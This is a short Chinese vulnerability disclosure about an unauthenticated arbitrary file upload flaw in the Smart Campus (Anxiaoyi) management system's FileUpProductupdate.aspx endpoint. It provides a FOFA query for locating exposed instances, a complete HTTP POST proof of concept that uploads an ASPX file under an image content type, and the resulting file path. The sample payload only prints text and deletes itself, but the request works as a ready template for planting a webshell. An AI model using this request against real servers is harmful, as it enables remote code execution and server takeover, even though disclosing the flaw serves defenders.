## 智慧校园(安校易)管理系统FileUpProductupdate.aspx任意文件上传漏洞

智慧校园(安校易)管理系统 FileUpProductupdate.aspx 接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。

## fofa

```
title="智慧综合管理平台登入"
```



## poc

```
POST /Module/FileUpPage/FileUpProductupdate.aspx HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
Connection: close
 
------21909179191068471382830692394
Content-Disposition: form-data; name="Filedata"; filename="qaz.aspx"
Content-Type: image/jpeg
 
<%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
------21909179191068471382830692394--
```

![image-20240524230505271](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405242305328.png)



文件路径

```
/Upload/Publish/000000/0_0_0_0/update.aspx
```

